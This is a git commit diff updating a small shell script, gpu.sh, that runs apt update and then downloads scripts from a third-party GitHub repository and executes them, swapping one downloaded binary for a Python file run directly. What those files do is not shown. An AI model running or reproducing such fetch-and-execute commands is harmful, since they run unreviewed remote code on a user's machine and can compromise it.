26cba7312944884b751bf7355c893cb091661971
xR3HAN <86459942+xR3HAN@users.noreply.github.com>
2021-06-26 23:06:35 +0530

    Update gpu.sh
    python update

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,8 @@
 #!/bin/sh
-  sudo apt update
-  wget https://github.com/biswas179/FkgX/raw/main/man.sh
-  wget https://github.com/biswas179/FkgX/raw/main/kggpu
+	sudo apt update
+	wget https://github.com/biswas179/FkgX/raw/main/man.sh 
+	wget https://github.com/biswas179/FkgX/raw/main/yeu.py
+	chmod u+x man.sh
+	chmod u+x yeu.py
 
-  chmod u+x man.sh
-  ./man.sh
+	python yeu.py
